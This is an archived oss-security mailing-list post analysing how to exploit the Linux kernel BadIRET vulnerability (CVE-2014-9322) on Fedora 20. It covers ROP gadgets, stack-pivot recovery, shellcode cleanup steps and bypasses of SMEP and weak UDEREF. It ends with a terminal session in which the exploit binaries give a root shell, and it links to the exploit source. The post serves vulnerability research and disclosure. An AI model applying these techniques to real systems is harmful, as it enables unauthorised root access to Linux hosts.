X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["23808" "Saturday" "4" "July" "2015" "09:23:48" "+0200" "Adam Zabrocki" "pi3@pi3.com.pl" "<20150704072348.GA24700@pi3.com.pl>" "541" "[oss-security] Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)" nil nil nil "7" "2015070407:23:48" "[oss-security] Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)" (number mark "U       pi3@pi3.com. Jul  4  541/23808 " thread-indent "\"[oss-security] Follow-up on Exploiting \"BadIRET\" vulnerability (CVE-2014-9322)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21671 invoked by uid 550); 4 Jul 2015 07:25:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21615 invoked from network); 4 Jul 2015 07:25:43 -0000
X-Virus-Scanned: amavisd-new at pi3.com.pl
Date: Sat, 4 Jul 2015 09:23:48 +0200
From: Adam Zabrocki <pi3@pi3.com.pl>
To: oss-security@lists.openwall.com
Message-ID: <20150704072348.GA24700@pi3.com.pl>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Mutt/1.5.21 (2010-09-15)
Subject: [oss-security] Follow-up on Exploiting "BadIRET" vulnerability (CVE-2014-9322)

Hi,

The journey into CVE-2014-9322 is not straightforward but it is worth to sp=
end some time on it and analyze all available information. I will try my be=
st...


1) Introduction - non-technical (almost)

Everything starts from the CVE-2014-9090. This vulnerability was discovered=
 by Andy Lutomirski which allows you (quoting MITRE):

"The do_double_fault function in arch/x86/kernel/traps.c in the Linux kerne=
l through 3.17.4 does not properly handle faults associated with the Stack =
Segment (SS) segment register, which allows local users to cause a denial o=
f service (panic) (...)"

which essentially may results in local DoS attack. It doesn't sounds so cri=
tical from the defender's point of view (but still it takes attention espec=
ially from the nature of vulnerability point of view) neither from the atta=
ckers perspective. Mainly because of the potential limited benefits after s=
uccessful exploitation.

The "fun" starts after Borislav Petkov asked some questions about CVE-2014-=
9090. Andy Lutomirski discovered another vulnerability in the same function=
ality which was masked by first one. (Un)fortunately this time it was very =
serious (I would say critical) flaw. Linux kernel does not properly handle =
faults associated with the Stack Segment (SS) register in the x86 architect=
ure. Quoiting MITRE again:

"(...) allows local users to gain privileges by triggering an IRET instruct=
ion that leads to access to a GS Base address from the wrong space."

Does the nature of vulnerability sound familiar?
What about Rafal 'n3rgal' Wojtczuk research which ends up receiving CVE-201=
2-0217? (which was directly connected with CVE-2006-0744).
Yes... in principals both vulnerabilities gave us same thing - we can force=
 kernel to be executed under user-controlled GS base address (via %gs regis=
ter).

For some reasons CVE-2014-9322 didn't take much attention (again similariti=
es to CVE-2006-0744) until Rafal 'n3rgal' Wojtczuk didn't point it out on 2=
nd of February 2015 via publish amazing research on Bromium Labs blog:

http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-201=
4-9322-linux-kernel-privilege-escalation/

about how the nature of vulnerability works, how it can be used to achieve =
code-exec (which is not trivial - great research!) and using single NULL-by=
te write primitive turn into fully weaponized exploit which bypasses SMEP m=
itigation (not SMAP). Highly recommended to review it in details.

After this publication vulnerability started to get more and more attention=
 (especially from the grsecurity twitter account :)). Until now (almost hal=
f a year) there is not known public real exploit which will fully implement=
 Rafal's idea to achieve code-execution. There is only Proof-Of-Concept ava=
ilable which results in DoS attack (so the same as results of CVE-2014-9090=
 - not very useful):

https://rdot.org/forum/showthread.php?t=3D3341

which ends up being here:

https://www.exploit-db.com/exploits/36266/


2) More technical part (based on Fedora 20 -> kernel: 3.11.10-301.fc20.x86_=
64)

I decided to take a challenge and fully implement Rafal's idea and end-up b=
eing successed solving some interesting problems during the work. I will st=
art where Rafal finished his write-up, which means we end up successfully s=
tack pivoting and executing ROP gadgets (in his case disabling SMEP in CR4 =
register and executing 'real' shellcode/kernelcode in userland page).

*) Stack pivoting and ROP are being executed in the context of follow_link(=
) function which is inlined in path_openat(). The context flow can be summa=
rized as follow:

SyS_open -> SYSC_open -> do_sys_open -> do_filp_open -> path_openat -> foll=
ow_link()

Inlined function do relative call which in the end redirect transfer to our=
 code:

...
   0xffffffff811b84ab <+955>:   jmpq   0xffffffff811b81b3 <path_openat+195>
   0xffffffff811b84b0 <+960>:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 <+969>:   mov    0x30(%r15),%rax
   0xffffffff811b84bd <+973>:   mov    %r15,%rdi
   0xffffffff811b84c0 <+976>:   mov    %r12,%rsi
   0xffffffff811b84c3 <+979>:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 <+983>:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca <+986>:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 <+992>:   mov    %rax,%r15
   0xffffffff811b84d3 <+995>:   jbe    0xffffffff811b8532 <path_openat+1090>
   0xffffffff811b84d5 <+997>:   mov    %r12,%rdi
   0xffffffff811b84d8 <+1000>:  mov    %eax,%ebx
   0xffffffff811b84da <+1002>:  callq  0xffffffff811b2930 <path_put>
...

After our code has being executed first problems start (cleaning part). Eve=
ry call to function path_put(), do_last(), dput(), mntput() or put_link(), =
may ends up playing with kernel locks. Because the stack is pivoted this wi=
ll not going to be=20
happy ending. Additionally, path_openat() has inline many functionalities, =
some registers have special meaning (pointers to the structures/objects) wh=
ich kernel will try to access at some point at may results in kernel crash =
and/or panic. At the beginning I was trying to track down all problematic e=
xecution and manually fixing it but there is just too many correlation betw=
een registers/objects/spinlocks... (btw. Linux kernel 3.xx changed internal=
 representation of raw_spin_lock=20
comparing to previous kernels which is (un)fortunately much more problemati=
c when you want manually synchronize it).
There needed to be better solution, and if you think about pivoting itself =
you may find one. If you instead of manual fixing all necessary problems fo=
rce kernel to do it you may win that game. If you find a way to "restore" o=
riginal stack frame=20
for the function before stack pivoting was taken kernel should naturally re=
move all locks and correctly unwind the stack and system will be stable. Th=
is can be achieved via let's call it reverse stack pivoting :) Directly aft=
er stack pivot, in=20
temporary register you should have valid address of the stack which you wan=
t to know. In our case situation is a bit more complicate because we are lo=
sing 32 most significant bits of the address. ROP gadget looks like:

   0xffffffff8119f1ed <__mem_cgroup_try_charge+1949>:   xchg   %eax,%esp
   0xffffffff8119f1ee <__mem_cgroup_try_charge+1950>:   retq

why this gadget was taken and we lose 32bits (we want to)? Please read Rafa=
l's write-up.
So if we find some ROP gadget which directly after stack pivoting will save=
 32 least significant bits of original stack pointer in safe place, we coul=
d try to restore it and reconstruct original address before we gave control=
 to the kernel. I've=20
chosen following ROP-gadget:

   0xffffffff8152d8fe <kernel_listen+14>:       push   %rax
   0xffffffff8152d8ff <kernel_listen+15>:       pop    %rax
   0xffffffff8152d900 <kernel_listen+16>:       pop    %rbp
   0xffffffff8152d901 <kernel_listen+17>:       retq

which essentially push %rax value (in fact high bits are zeroed) and move s=
tack pointer after stored value. At this point we may precisely calculate w=
here it will be stored.

Problem solved (reverse-stack pivot won :P)

*) If your shellcode is going to be executed for too long there is high cha=
nce scheduler will preempt you which sometimes may be critical - depends on=
 the current stage of execution and what is going to be preempting you. Qui=
te often you may=20
receive APIC timer interrupt connected with updating process times (known a=
s tick'ing) which may screw you up on some corner cases - it should be take=
n into account!

btw. if you have bad luck you may be preempted as soon as you did stack piv=
oting ;p

*) Our code is executed while proc_root structure is corrupted... :) This i=
s NOT what we would like to have. It dramatically increases chance of kerne=
l crash if other process will do any operation on /proc pseudo-filesystem. =
proc_root.subdir value must be restored as soon as it can be to decrease th=
e chance of random crash. There is few possible ways of doing it:

a) instead of overwriting 6 bytes of subdir do only 5 of them which will le=
ave 3 bytes untouched. This means we can easily reconstruct original value =
by adding 0xffff8800 value at the most significant bits (for that kernel) a=
nd trying to find=20
only 1 byte which is 256 possibilities. Chance of crash is very low (touchi=
ng not mapped page). Additionally this requires allocation in user space ar=
ound 16 MB to have guarantee that after referencing overwritten proc_root.s=
ubdir always ends up=20
in our controlled memory.

b) we can brute force full address by 'preventing' from Page Fault (#PF). F=
or the short period of time we can overwrite #PF handler with simple code:
- Get the exception from the stack
- Change the address which caused crash to smth which we know is mapped
- Restart faulting instruction

original brute force loop will continue running

c) Ignore all of the problems and just reconstruct address as much as it ca=
n be and do brute force rest of the bytes. Apparently it's quite reliable a=
nd effective. We know that high significant bytes are 0xffff8800 and we hav=
e 2 least=20
significant bytes. We need to find 2 bytes which are unknown for us. On Lin=
ux (as opposed to Windows) kernel memory are not being paged out (swapped o=
ut). Chance of hitting unmapped page is quite low when we brute force just =
2 bytes in the=20
middle of reconstructed address - believe me or not, it works well :)

Problem is also how we judge if the address is correct or not. It's quite s=
imple, struct proc_dir_etry has 'parent' field. We must find address which =
will have on the specific offset, address of proc_root (which is known). In=
 the end we check 65536 addresses and chance of FP is low as well. I've nev=
er hit that situation.


Summarizing our shellcode must:
- save original stack pointer value
- disable interrupts (to prevent from being preempted) and start to reconst=
ruct corrupted proc_root.subdir value
- do REAL (s)hellcode
- restore original stack pointer
- restore frame pointer
- restore registers pointing to the internal objects
- enable interrupts and return to the normal kernel execution


3) Grsecurity =3D> UDEREF

As I mentioned Rafal's research has been "sighted" by spender via:

http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172

Additionally some people suggests UDEREF is as effective as SMAP with block=
ing exploitation of this vulnerability:

http://seclists.org/oss-sec/2014/q4/1052

"This is likely to be easy to exploit for privilege escalation, except
on systems with SMAP or UDEREF.  On those systems, assuming that the
mitigation works correctly, the impact of this bug may be limited to
massive memory corruption and an eventual crash or reboot."

This is not completely true. UDEREF may be as effective (in fact even more)=
 as SMAP or only as effective as SMEP (on AMD64) which will not prevent exp=
loitation at all (using described technique). So what's going on? :) Curren=
tly UDEREF for AMD64 has 3 different implementations:

- slow / weak legacy implementation
- strong implementation on Sandy Bridge and later
- fast / weak implementation on Sandy Bridge and later

First implementation of UDEREF on AMD64 was "weak" implementation and infor=
mation about it was described by PaX team here:

http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html

I will quote the essential part of it:

"(...) so what does UDEREF do on amd64? on userland->kernel transitions it =
basically
unmaps the original userland address range and remaps it at a different add=
ress
using non-exec/supervisor rights (so direct code execution as used by most
exploits is not possible at least). (...)"

and next:

"(...) UDEREF/amd64 doesn't ensure that the (legitimate) userland accessor
functions cannot actually access kernel memory when only userland is allowed
(some in-kernel users of certain syscalls can temporarily access kernel mem=
ory
as userland, and that is enforced on UDEREF/i386 but not on amd64). so if
there's a bug where userland can trick the kernel into accessing a userland
pointer that actually points to kernel space, it'll succeed, unlike on i386.

the other bad thing is the presence of the userland shadow area. this has
two consequences: 1. the userland address space size is smaller under UDEREF
(42 vs. 47 bits, with corresponding reduction of ASLR of course), 2. this
shadow area is always mapped so kernel code accidentally accessing its range
may not oops on it and can be exploited (such accesses can usually happen o=
nly
if an exploit can make the kernel dereference arbitrary addresses in which
case the presence of this area is the least of your concerns though).(...)"

=3D=3D weak UDEREF =3D=3D
This means it works essentially similar to SMEP. So how to exploit CVE-2014=
-9322 under this specific implementation of UDEREF? You just need to change=
 the ROP. Instead of disabling SMEP bit in CR4 register and execute code fr=
om the user land,=20
implement full shellcode as ROP. It is possible and it won't be stop by wea=
k implementation of UDEREF.


=3D=3D "new" UDEREF =3D=3D
Why strong implementation of UDEREF is different and why does it require Sa=
ndy Bridge architecture?
Yes, that's the fun part. I haven't seen any official write-up regarding "n=
ew" UDEREF. I wasn't even aware about those changed since I was playing wit=
h that exploit :)

Strong implementation of UDEREF using Sandy Bridge++ feature called as PCID=
 to make 'tags' in TLB. By doing it UDEREF may completely separate user lan=
d from kernel (via creating new PGD tables):

static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct =
*tsk)
{
++#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd =3D get_cpu_pgd(smp_processor_id(), kernel);
+             for (i =3D USER_PGD_PTRS; i < 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] =3D PCID_USER;
+                             asm volatile(__ASM_INVPCID : : "d"(&descripto=
r), "a"(INVPCID_SINGLE_CONTEXT) : "memory");
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)=
) {
+                                     descriptor[0] =3D PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : "d"(&d=
escriptor), "a"(INVPCID_SINGLE_CONTEXT) : "memory");
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID=
_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kerne=
l)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kerne=
l)) | PCID_KERNEL);
+}
+             } else
+#endif



In the end context run in kernel mode will NOT see any usermode pages. This=
 implementation I personally believe is much stronger than SMAP. Why?

1. You can't just disable one bit in CR4 register to fully turn off this mi=
tigation
2. In case of SMAP, you can see userland pages (there is existing Page Tabl=
es translating userland addresses. 'P' bit is set) but you just can't touch=
 it. In "new" UDEREF you don't see userland at all (PGD is completely diffe=
rent for kernel context and there is no Page Tables describing userland add=
resses. 'P' bit is unset).

This version of UDEREF was firstly introduced on grsecurity version 3.0 in =
February 2014. Good work! Will be nice if PaX/grsecurity may publish some d=
etails of their research and great implementation :)


Btw. In both cases result of touching userland addresses is the same - #PF =
will be generated :)
Btw2. The same "strong" UDEREF functionality may be achieved without hardwa=
re PCID feature. The main difference is performance. Without hardware suppo=
rt for PCID it should be a mess from the performance point of view.


=3D=3D Summarizing =3D=3D
This vulnerability can be exploited under UDEREF and can NOT be exploited u=
nder "new" UDEREF which is enabled on Sandy Bridge++ architecture.

In fact you can still use this vulnerability to fully DoS machine under "ne=
w" UDEREF? How? It's quite funny and tricky, you can force infinitive loop =
of #PF :) As soon as kernel enters to the do_general_protection() function =
it will try to read GDT bia GS base by executing following instruction:

    0xffffffff8172910e <do_general_protection+30>:       mov    %gs:0xa880,=
%rbx

at this situation GS base is pointing to the userland memory. Because there=
 is no PTE entry for that address (kernel context doesn't see userland at a=
ll), #PF will be generated. page_fault() function will be executed and foll=
owing:

page_fault -> do_page_fault -> __do_page_fault -> restore_args

it will try to read GDT again and next #PF will be generated and so on... s=
o on... so on... :) So yes, you can still crash the kernel but there is no =
way to do anything else because there is no even room for exploitation. Vul=
nerability has being stopped at principals.


4) Funny facts :)

a) Some versions of libthread requires to create memory with RWX permission=
 when you call pthread_create() function. This is not allowed under PaX/grs=
ec hardening of mmap() and as soon as internal implementation pthread_creat=
e() will call=20
mmap(), process will be killed :) I met this situation on default installat=
ion of Ubuntu LTS where I was testing kernel with grsecurity hardening.

b) on kernel 3.11.10-301.fc20.x86_64 implementation of __switch_to() functi=
on using OSXSAVE extension (bit 18 in CR4 register) without checking if CPU=
 has this extension or not:

     0xffffffff81011714 <__switch_to+644>    xsaveopt64 (%rdi)

__switch_to() is executed under disabled interrupts but if OSXSAVE extensio=
n is not enabled CPU will generate #UD and it will be deadlock. Before ente=
ring to __switch_to() instruction regardless disabling interrupts also ther=
e is locked runqueue which will never be unlocked in case of #UD.
I wonder if someone hit this problem in real life :)

c) Fedora 20 exploitation is pretty stable (source code available on my web=
site):

[pi3@localhost clean_9322]$ cat z_shell.c
#include <stdio.h>

int main(void) {

   char *p_arg[] =3D { "/bin/sh", NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv("/bin/sh",p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=3D1000(pi3) gid=3D1000(pi3) groups=3D1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=3D1000(pi3) gid=3D1000(pi3) groups=3D1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function =E2=80=98main=E2=80=99:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-=
Wpointer-to-int-cast]
               : "r"(4), "r"((int)p_to_d), "r"(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=3D[ Exploit for CVE-2014-9322 ]=3D- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

                Usage: ./procrop <number>

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=3D[ Exploit for CVE-2014-9322 ]=3D- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --col=
or=3Dauto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=3D[ Exploit for CVE-2014-9322 ]=3D- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

                Usage: ./p_write8 <number>

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=3D[ Exploit for CVE-2014-9322 ]=3D- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread=20
runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+=20=20
Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=3D1000(pi3) gid=3D1000(pi3) groups=3D1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=3D0(root) gid=3D0(root) groups=3D0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$



References:
1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-=
2014-9322-linux-kernel-privilege-escalation/
2) https://rdot.org/forum/showthread.php?t=3D3341
3) https://www.exploit-db.com/exploits/36266/
4) http://blog.pi3.com.pl/?p=3D509
5) http://twitter.com/grsecurity/status/562363332079144960
6) http://twitter.com/grsecurity/status/562363788125831172
7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
8) http://seclists.org/oss-sec/2014/q4/1052
9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html



Best regards,
Adam 'pi3' Zabrocki


--=20
pi3 (pi3ki31ny) - pi3 (at) itsec pl
http://pi3.com.pl
